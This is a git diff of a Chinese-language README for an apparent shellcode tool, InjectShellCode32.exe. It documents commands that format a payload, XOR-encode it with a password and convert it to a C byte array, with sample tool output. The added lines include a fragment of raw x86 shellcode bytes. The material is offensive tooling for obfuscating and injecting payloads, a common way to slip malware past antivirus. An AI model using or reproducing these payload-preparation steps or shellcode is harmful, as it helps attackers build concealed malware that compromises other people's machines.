@@ -126,27 +126,28 @@ InjectShellCode32.exe FormatFile --path d://shellcode.txt --output d://output_sh
 ```
 
  - 将一行攻击载荷进行异或处理
-
 ```C
 InjectShellCode32.exe Xor --path d://output_shellcode.txt --passwd lyshark
 
 % &{{%ssssssuspr'q{z&vuw{!vqps{!vqs {!vqrws%!tw"qu{!tqq{pr%%pr s" p urtwst{%s!v"qvuu"ssvp%%'v
 ```
 
-
-
-
-
-
-
-
-**压缩载荷并转字节数组:** 将一段已经压缩过的shellcode代码转换为字节数组格式，这个格式可以直接使用。
-```
-C:\Users\admin\Desktop> sc32.exe Xchg --input d://format.txt --output d://array.txt
-
+ - 将一段压缩载荷转换成字节数组
+```C
+InjectShellCode32.exe Xchg --input d://output_shellcode.txt --output d://array.txt
 [+] 字节已转为双字节
 [*] 已写出ShellCode列表 => d://array.txt
+
+"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
+"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
+"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
+"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
 ```
+
+
+
+
 
 **异或加密/解密字节数组:** 将字节数组整体加密或解密为字节数组，无需在程序代码中转换，使用更方便。
 ```
